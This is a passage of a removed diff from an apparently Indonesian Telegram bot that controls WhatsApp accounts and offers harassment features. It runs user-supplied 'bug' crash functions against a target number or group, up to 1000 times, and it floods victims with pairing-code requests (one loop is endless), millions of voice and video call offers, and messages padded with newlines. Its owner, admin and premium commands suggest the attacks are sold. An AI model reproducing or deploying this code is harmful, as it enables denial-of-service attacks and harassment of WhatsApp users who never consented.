-        let fn;
-        if (funcCode.includes("async function")) {
-            const matchFunc = funcCode.match(/async function\s+(\w+)/);
-            const funcName = matchFunc ? matchFunc[1] : null;
-            fn = vm.runInContext(`${funcCode}\n${funcName}`, context);
-        } else {
-            const wrapper = `async function tempFunc(sock, target) { 
-                try { ${funcCode} } catch(e) {} 
-            }; tempFunc`;
-            fn = vm.runInContext(wrapper, context);
-        }
-
-        // --- UPDATE STATUS KE PROCESSING ---
-        await bot.editMessageCaption(`
-<blockquote><pre>⬡═―—⊱ ⎧ Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group ⎭ ⊰―—═⬡</pre></blockquote>
-▢  Target: Group Link
-▢  Type: GB Auto Join & Bug
-▢  Status: Sending ${jumlah} Bug...
-╘═——————————————═⬡`, {
-            chat_id: chatId,
-            message_id: processMsg.message_id,
-            parse_mode: "HTML"
-        });
-
-        // --- EKSEKUSI LOOP ---
-        for (let i = 0; i < jumlah; i++) {
-            try {
-                await fn(safeSock, targetJid);
-                console.log(chalk.green(`[SUCCESS] Bug ke-${i+1} terkirim.`));
-            } catch (e) {
-                console.log(chalk.red(`[ERROR] Bug ke-${i+1} gagal: ${e.message}`));
-            }
-            await sleep(2000);
-        }
-
-        // --- FINAL STATUS ---
-        await bot.editMessageCaption(`
-<blockquote><pre>⬡═―—⊱ ⎧ Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group ⎭ ⊰―—═⬡</pre></blockquote>
-▢  Target: ${groupLink}
-▢  Type: GB SUCCESS
-▢  Status: Join & Success Sent ${jumlah} Bug
-╘═——————————————═⬡`, {
-            chat_id: chatId,
-            message_id: processMsg.message_id,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [[{ text: "! Check", url: groupLink }]]
-            }
-        });
-
-    } catch (err) {
-        console.error(err);
-        bot.sendMessage(chatId, "⚠️ Terjadi kesalahan pada sistem.");
-    }
-});
-
-bot.onText(/^\/testfunc (.+)/, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id;
-    const senderId = msg.from.id;
-    const targetNumber = match[1];
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
-    const jid = `${formattedNumber}@s.whatsapp.net`;
-    const randomImage = getRandomImage();
-
-    const replyId = msg.reply_to_message
-      ? msg.reply_to_message.message_id
-      : msg.message_id;
-
-    const args = msg.text.split(" ");
-
-    if (args.length < 3)
-      return bot.sendMessage(
-        chatId,
-        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
-        { reply_to_message_id: replyId }
-      );
-
-    if (sessions.size === 0) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote><tg-emoji emoji-id="5350496629008917458">🚫</tg-emoji> Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx</blockquote>`,
-        parse_mode: "HTML",
-      });
-    }
-
-    const q = args[1];
-
-    const jumlah = Math.max(
-      0,
-      Math.min(parseInt(args[2]) || 1, 1000)
-    );
-
-    if (isNaN(jumlah) || jumlah <= 0)
-      return bot.sendMessage(
-        chatId,
-        "❌ ☇ Jumlah harus angka",
-        { reply_to_message_id: replyId }
-      );
-
-    const target =
-      q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    let funcCode = "";
-
-    if (msg.reply_to_message) {
-      if (msg.reply_to_message.text) {
-        funcCode = msg.reply_to_message.text;
-      }
-      else if (msg.reply_to_message.document) {
-
-        const fileName =
-          msg.reply_to_message.document.file_name || "";
-
-        if (
-          !fileName.endsWith(".js") &&
-          !fileName.endsWith(".txt")
-        ) {
-          return bot.sendMessage(
-            chatId,
-            "❌ ☇ File harus .js atau .txt",
-            { reply_to_message_id: replyId }
-          );
-        }
-
-        const fileId =
-          msg.reply_to_message.document.file_id;
-
-        const file =
-          await bot.getFile(fileId);
-
-        const fileUrl =
-          `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
-
-        const response =
-          await axios.get(fileUrl);
-
-        funcCode = response.data;
-      }
-    }
-
-    if (!funcCode)
-      return bot.sendMessage(
-        chatId,
-        "❌ ☇ Reply function text atau file .js/.txt",
-        { reply_to_message_id: replyId }
-      );
-    const processMsg = await bot.sendPhoto(
-      chatId,
-      randomImage,
-      {
-        caption: `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
-⌑ Target: ${q}
-⌑ Type: Unknown Function
-⌑ Status: Process <tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>
-</blockquote>`,
-        parse_mode: "HTML",
-        reply_to_message_id: replyId,
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: "Check Target",
-                url: `https://wa.me/${formattedNumber}`,
-                style: "danger"
-              },
-            ],
-          ],
-        },
-      }
-    );
-
-    const processMessageId =
-      processMsg.message_id;
-
-    const createSafeSock = (sock) => sock;
-
-    const safeSock =
-      createSafeSock(sock);
-
-    const matchFunc = funcCode.match(
-      /async function\s+([a-zA-Z0-9_]+)/
-    );
-
-    if (!matchFunc)
-      return bot.sendMessage(
-        chatId,
-        "❌ ☇ Function tidak valid",
-        { reply_to_message_id: replyId }
-      );
-
-    const funcName = matchFunc[1];
-
-    const sandbox = {
-      console,
-      Buffer,
-      sock: safeSock,
-      target,
-      sleep,
-      generateWAMessageFromContent,
-      generateForwardMessageContent,
-      generateWAMessage,
-      prepareWAMessageMedia,
-      proto,
-      jidDecode,
-      areJidsSameUser,
-    };
-
-    const context =
-      vm.createContext(sandbox);
-
-    const wrapper = `
-${funcCode}
-
-${funcName}
-`;
-
-    const fn =
-      vm.runInContext(wrapper, context);
-
-    for (let i = 0; i < jumlah; i++) {
-
-      try {
-
-        const arity = fn.length;
-
-        if (arity === 1) {
-
-          await fn(target);
-
-        } else if (arity === 2) {
-
-          await fn(safeSock, target);
-
-        } else {
-
-          await fn(
-            safeSock,
-            target,
-            true
-          );
-
-        }
-
-      } catch (err) {
-
-        console.error(err);
-
-      }
-
-      await sleep(200);
-
-    }
-
-    const finalText = `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
-⌑ Target: ${q}
-⌑ Type: Unknown Function
-⌑ Status: Success <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>
-</blockquote>`;
-
-    try {
-
-      await bot.editMessageCaption(
-        finalText,
-        {
-          chat_id: chatId,
-          message_id: processMessageId,
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "Check Target",
-                  url: `https://wa.me/${formattedNumber}`,
-                  style: "danger"
-                },
-              ],
-            ],
-          },
-        }
-      );
-
-    } catch (e) {
-
-      await bot.sendPhoto(
-        chatId,
-        randomImage,
-        {
-          caption: finalText,
-          parse_mode: "HTML",
-          reply_to_message_id: replyId,
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "Check Target",
-                  url: `https://wa.me/${formattedNumber}`,
-                  style: "danger"
-                },
-              ],
-            ],
-          },
-        }
-      );
-
-    }
-
-  } catch (err) {
-
-    console.error(err);
-
-    bot.sendMessage(
-      msg.chat.id,
-      "FUNCTION LU EROR BANGKE",
-      {
-        reply_to_message_id: msg.message_id,
-      }
-    );
-
-  }
-});
-
-bot.onText(/^\/testfuncgb (.+)/, async (msg, match) => {
-  try {
-    const chatId = msg.chat.id;
-    const senderId = msg.from.id;
-    const targetInput = match[1]; // Bisa link group atau nomor
-    const randomImage = getRandomImage();
-
-    const replyId = msg.reply_to_message
-      ? msg.reply_to_message.message_id
-      : msg.message_id;
-
-    const args = msg.text.split(" ");
-
-    if (args.length < 3)
-      return bot.sendMessage(
-        chatId,
-        "🪧 ☇ Format: /testfuncgb linkgrup 10 (reply function/file)",
-        { reply_to_message_id: replyId }
-      );
-
-    if (sessions.size === 0) {
-      return bot.sendPhoto(chatId, randomImage, {
-        caption: `<blockquote><tg-emoji emoji-id="5350496629008917458">🚫</tg-emoji> Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx</blockquote>`,
-        parse_mode: "HTML",
-      });
-    }
-
-    // Ambil session pertama yang tersedia
-    const sock = sessions.values().next().value; 
-
-    const jumlah = Math.max(
-      0,
-      Math.min(parseInt(args[2]) || 1, 1000)
-    );
-
-    if (isNaN(jumlah) || jumlah <= 0)
-      return bot.sendMessage(
-        chatId,
-        "❌ ☇ Jumlah harus angka",
-        { reply_to_message_id: replyId }
-      );
-
-    let target = "";
-    let isGroup = false;
-
-    // Logika Deteksi Link Grup
-    if (targetInput.includes("chat.whatsapp.com/")) {
-      const inviteCode = targetInput.split("chat.whatsapp.com/")[1];
-      try {
-        // Mendapatkan JID grup dari link invite
-        target = await sock.groupAcceptInvite(inviteCode);
-        isGroup = true;
-      } catch (err) {
-        return bot.sendMessage(chatId, "❌ ☇ Link grup tidak valid atau bot sudah dikeluarkan", { reply_to_message_id: replyId });
-      }
-    } else {
-      // Jika bukan link, anggap nomor telepon
-      target = targetInput.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    }
-
-    let funcCode = "";
-
-    if (msg.reply_to_message) {
-      if (msg.reply_to_message.text) {
-        funcCode = msg.reply_to_message.text;
-      } else if (msg.reply_to_message.document) {
-        const fileName = msg.reply_to_message.document.file_name || "";
-        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
-          return bot.sendMessage(
-            chatId,
-            "❌ ☇ File harus .js atau .txt",
-            { reply_to_message_id: replyId }
-          );
-        }
-        const fileId = msg.reply_to_message.document.file_id;
-        const file = await bot.getFile(fileId);
-        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
-        const response = await axios.get(fileUrl);
-        funcCode = response.data;
-      }
-    }
-
-    if (!funcCode)
-      return bot.sendMessage(
-        chatId,
-        "❌ ☇ Reply function text atau file .js/.txt",
-        { reply_to_message_id: replyId }
-      );
-
-    const processMsg = await bot.sendPhoto(
-      chatId,
-      randomImage,
-      {
-        caption: `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
-
-⌑ Target: ${isGroup ? "WhatsApp Group" : targetInput}
-⌑ Type: Unknown Function
-⌑ Status: Process <tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>
-
-</blockquote>`,
-        parse_mode: "HTML",
-        reply_to_message_id: replyId,
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: "Check Target",
-                url: isGroup ? targetInput : `https://wa.me/${targetInput.replace(/[^0-9]/g, "")}`,
-              },
-            ],
-          ],
-        },
-      }
-    );
-
-    const processMessageId = processMsg.message_id;
-    const createSafeSock = (sock) => sock;
-    const safeSock = createSafeSock(sock);
-
-    const matchFunc = funcCode.match(
-      /async function\s+([a-zA-Z0-9_]+)/
-    );
-
-    if (!matchFunc)
-      return bot.sendMessage(
-        chatId,
-        "❌ ☇ Function tidak valid",
-        { reply_to_message_id: replyId }
-      );
-
-    const funcName = matchFunc[1];
-
-    const sandbox = {
-      console,
-      Buffer,
-      sock: safeSock,
-      target,
-      sleep,
-      generateWAMessageFromContent,
-      generateForwardMessageContent,
-      generateWAMessage,
-      prepareWAMessageMedia,
-      proto,
-      jidDecode,
-      areJidsSameUser,
-    };
-
-    const context = vm.createContext(sandbox);
-    const wrapper = `
-      ${funcCode}
-      ${funcName}
-    `;
-
-    const fn = vm.runInContext(wrapper, context);
-
-    for (let i = 0; i < jumlah; i++) {
-      try {
-        const arity = fn.length;
-        if (arity === 1) {
-          await fn(target);
-        } else if (arity === 2) {
-          await fn(safeSock, target);
-        } else {
-          await fn(safeSock, target, true);
-        }
-      } catch (err) {
-        console.error(err);
-      }
-      await sleep(200);
-    }
-
-    const finalText = `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
-
-⌑ Target: ${isGroup ? "WhatsApp Group" : targetInput}
-⌑ Type: Unknown Function
-⌑ Status: Success <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>
-
-</blockquote>`;
-
-    try {
-      await bot.editMessageCaption(
-        finalText,
-        {
-          chat_id: chatId,
-          message_id: processMessageId,
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "Check Target",
-                  url: isGroup ? targetInput : `https://wa.me/${targetInput.replace(/[^0-9]/g, "")}`,
-                },
-              ],
-            ],
-          },
-        }
-      );
-    } catch (e) {
-      await bot.sendPhoto(
-        chatId,
-        randomImage,
-        {
-          caption: finalText,
-          parse_mode: "HTML",
-          reply_to_message_id: replyId,
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "Check Target",
-                  url: isGroup ? targetInput : `https://wa.me/${targetInput.replace(/[^0-9]/g, "")}`,
-                },
-              ],
-            ],
-          },
-        }
-      );
-    }
-  } catch (err) {
-    console.error(err);
-    bot.sendMessage(
-      msg.chat.id,
-      "FUNCTION LU EROR BANGKE",
-      {
-        reply_to_message_id: msg.message_id,
-      }
-    );
-  }
-});
-
-
-
-bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const userId = msg.from.id;
-
-  if (!isOwner(userId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
-    );
-  }
-
-  const target = match[1];
-  const count = parseInt(match[2]) || 999999;
-
-  bot.sendMessage(
-    chatId,
-    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
-  );
-
-  try {
-    const { state } = await useMultiFileAuthState("senzypairing");
-    const { version } = await fetchLatestBaileysVersion();
-
-    const sucked = await makeWASocket({
-      printQRInTerminal: false,
-      mobile: false,
-      auth: state,
-      version,
-      logger: pino({ level: "fatal" }),
-      browser: ["Mac Os", "chrome", "121.0.6167.159"],
-    });
-
-    for (let i = 0; i < count; i++) {
-      await sleep(1600);
-      try {
-        await sucked.requestPairingCode(target);
-      } catch (e) {
-        console.error(`Gagal spam pairing ke ${target}:`, e);
-      }
-    }
-
-    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
-  } catch (err) {
-    console.error("Error:", err);
-    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
-  }
-});
-
-bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
-  const senderId = msg.from.id;
-  const chatId = msg.chat.id;
-  // Check if the command is used in the allowed group
-
-    if (sessions.size === 0) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-      );
-    }
-    
-if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ You are not authorized to view the premium list."
-    );
-  }
-
-  if (!match[1]) {
-    return bot.sendMessage(
-      chatId,
-      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
-    );
-  }
-
-  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
-  if (!/^\d+$/.test(numberTarget)) {
-    return bot.sendMessage(
-      chatId,
-      "🚫 Invalid input. Example: /overload 62×××."
-    );
-  }
-
-  const formatedNumber = numberTarget + "@s.whatsapp.net";
-
-  await bot.sendPhoto(chatId, "https://files.catbox.moe/k8nmnc.jpg", {
-    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
-┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
-┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
-  });
-
-  for (let i = 0; i < 9999999; i++) {
-    await sendOfferCall(formatedNumber);
-    await sendOfferVideoCall(formatedNumber);
-    await new Promise((r) => setTimeout(r, 1000));
-  }
-});
-
-
-bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const senderId = msg.from.id;
-    const q = match[1]; // Ambil argumen setelah /delete-bug
-  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ You are not authorized to view the premium list."
-    );
-  }
-
-    if (!q) {
-        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/hapusbug 62xxx`);
-    }
-    
-    let pepec = q.replace(/[^0-9]/g, "");
-    if (pepec.startsWith('0')) {
-        return bot.sendMessage(chatId, `Contoh : /hapusbug 62xxx`);
-    }
-    
-    let target = pepec + '@s.whatsapp.net';
-    
-    try {
-        for (let i = 0; i < 3; i++) {
-            await sock.sendMessage(target, { 
-                text: "Developer 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nXylent"
-            });
-        }
-        bot.sendMessage(chatId, "Done Clear Bug By 𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄😜");l
-    } catch (err) {
-        console.error("Error:", err);
-        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
-    }
-});
-
-bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const fromId = msg.from.id;
-
-  if (!isOwner(fromId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
-    );
-  }
-
-  const q = match[1];
-  if (!q) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
-    );
-  }
-
-  const target = q.replace(/[^0-9]/g, "").trim();
-  const pepec = `${target}@s.whatsapp.net`;
-
-  try {
-    const { state } = await useMultiFileAuthState("senzyreport");
-    const { version } = await fetchLatestBaileysVersion();
-
-    const sucked = await makeWASocket({
-      printQRInTerminal: false,
-      mobile: false,
-      auth: state,
-      version,
-      logger: pino({ level: "fatal" }),
-      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
-    });
-
-    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);
-
-    while (true) {
-      await sleep(1500);
-      await sucked.requestPairingCode(target);
-    }
-  } catch (err) {
-    console.error(err);
-    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
-  }
-});
-
-//=======case owner=======//
-bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return bot.sendMessage(
-      chatId,
-      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  }
-
-    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
-    if (!isOwner(senderId)) {
-        return bot.sendMessage(
-            chatId,
-            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
-            { parse_mode: "Markdown" }
-        );
-    }
-
-    // Pengecekan input dari pengguna
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
-    }
-
-    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
-    if (!/^\d+$/.test(userId)) {
-        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
-    }
-
-    // Cari dan hapus user dari adminUsers
-    const adminIndex = adminUsers.indexOf(userId);
-    if (adminIndex !== -1) {
-        adminUsers.splice(adminIndex, 1);
-        saveAdminUsers();
-        console.log(`${senderId} Removed ${userId} From Admin`);
-        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
-    } else {
-        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
-    }
-});
-
-bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return bot.sendMessage(
-      chatId,
-      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  }
-
-    if (!match || !match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
-    }
-
-    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
-    if (!/^\d+$/.test(userId)) {
-        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
-    }
-
-    if (!adminUsers.includes(userId)) {
-        adminUsers.push(userId);
-        saveAdminUsers();
-        console.log(`${senderId} Added ${userId} To Admin`);
-        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
-    } else {
-        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
-    }
-});
-
-
-bot.onText(/\/addowner (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return bot.sendMessage(
-      chatId,
-      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  }
-
-  const newOwnerId = match[1].trim();
-
-  try {
-    const configPath = "./config.js";
-    const configContent = fs.readFileSync(configPath, "utf8");
-
-    if (config.OWNER_ID.includes(newOwnerId)) {
-      return bot.sendMessage(
-        chatId,
-        `\`\`\`
-╭─────────────────
-│    GAGAL MENAMBAHKAN    
-│────────────────
-│ User ${newOwnerId} sudah
-│ terdaftar sebagai owner
-╰─────────────────\`\`\``,
-        {
-          parse_mode: "Markdown",
-        }
-      );
-    }
-
-    config.OWNER_ID.push(newOwnerId);
-
-    const newContent = `module.exports = {
-  BOT_TOKEN: "${config.BOT_TOKEN}",
-  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
-};`;
-
-    fs.writeFileSync(configPath, newContent);
-
-    await bot.sendMessage(
-      chatId,
-      `\`\`\`
-╭─────────────────
-│    BERHASIL MENAMBAHKAN    
-│────────────────
-│ ID: ${newOwnerId}
-│ Status: Owner Bot
-╰─────────────────\`\`\``,
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  } catch (error) {
-    console.error("Error adding owner:", error);
-    await bot.sendMessage(
-      chatId,
-      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  }
-});
-
-bot.onText(/\/delowner (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  if (!isOwner(msg.from.id)) {
-    return bot.sendMessage(
-      chatId,
-      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  }
-
-  const ownerIdToRemove = match[1].trim();
-
-  try {
-    const configPath = "./config.js";
-
-    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
-      return bot.sendMessage(
-        chatId,
-        `\`\`\`
-╭─────────────────
-│    GAGAL MENGHAPUS    
-│────────────────
-│ User ${ownerIdToRemove} tidak
-│ terdaftar sebagai owner
-╰─────────────────\`\`\``,
-        {
-          parse_mode: "Markdown",
-        }
-      );
-    }
-
-    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);
-
-    const newContent = `module.exports = {
-  BOT_TOKEN: "${config.BOT_TOKEN}",
-  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
-};`;
-
-    fs.writeFileSync(configPath, newContent);
-
-    await bot.sendMessage(
-      chatId,
-      `\`\`\`
-╭─────────────────
-│    BERHASIL MENGHAPUS    
-│────────────────
-│ ID: ${ownerIdToRemove}
-│ Status: User Biasa
-╰─────────────────\`\`\``,
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  } catch (error) {
-    console.error("Error removing owner:", error);
-    await bot.sendMessage(
-      chatId,
-      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
-      {
-        parse_mode: "Markdown",
-      }
-    );
-  }
-});
-
-bot.onText(/\/listbot/, async (msg) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-
-  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ You are not authorized to view the premium list."
-    );
-  }
-
-  try {
-    if (sessions.size === 0) {
-      return bot.sendMessage(
-        chatId,
-        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
-      );
-    }
-
-    let botList = 
-  "```" + "\n" +
-  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
-  "║\n" +
-  "┃\n";
-
-let index = 1;
-
-for (const [botNumber, sock] of sessions.entries()) {
-  const status = sock.user ? "🟢" : "🔴";
-  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
-  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
-  botList += "║\n";
-  index++;
-}
-botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
-botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
-botList += "```";
-
-
-    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
-  } catch (error) {
-    console.error("Error in listbot:", error);
-    await bot.sendMessage(
-      chatId,
-      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
-    );
-  }
-});
-
-bot.onText(/\/addsender (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  
-  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
-    return bot.sendMessage(
-      chatId,
-      `<tg-emoji emoji-id="5350496629008917458">⛔</tg-emoji> <b>Akses Ditolak</b>\nAnda tidak memiliki izin untuk menggunakan command ini.`,
-      { parse_mode: "HTML" } // Ganti ke HTML agar tg-emoji jalan
-    );
-  }
-
-  const botNumber = match[1].replace(/[^0-9]/g, "");
-
-  try {
-    await connectToWhatsApp(botNumber, chatId);
-    // Tambahkan pesan sukses di sini jika perlu
-  } catch (error) {
-    // Pastikan variabel botNum atau botNumber konsisten (di kode kamu tadi botNum belum didefinisikan)
-    console.error(`bot ${botNumber}:`, error); 
-    bot.sendMessage(
-      chatId,
-      `<tg-emoji emoji-id="6098421155897545579">📢</tg-emoji> <b>Terjadi kesalahan</b> saat menghubungkan ke WhatsApp. Silakan coba lagi.`,
-      { parse_mode: "HTML" } // Tambahkan ini juga
-    );
-  }
-});
-
-
-const moment = require("moment");
-
-bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
-  const chatId = msg.chat.id;
-  const response = setCooldown(match[1]);
-
-  bot.sendMessage(chatId, response);
-});
-
-const pendingPremium = {};
-
-bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ You are not authorized to add premium users."
-    );
-  }
-
-  if (!match[1]) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
-    );
-  }
-
-  const args = match[1].split(" ");
-  if (args.length < 2) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
-    );
-  }
-
-  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
-  const duration = args[1];
-
-  if (!/^\d+$/.test(userId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
-    );
-  }
-
-  if (!/^\d+[dhm]$/.test(duration)) {
-    return bot.sendMessage(
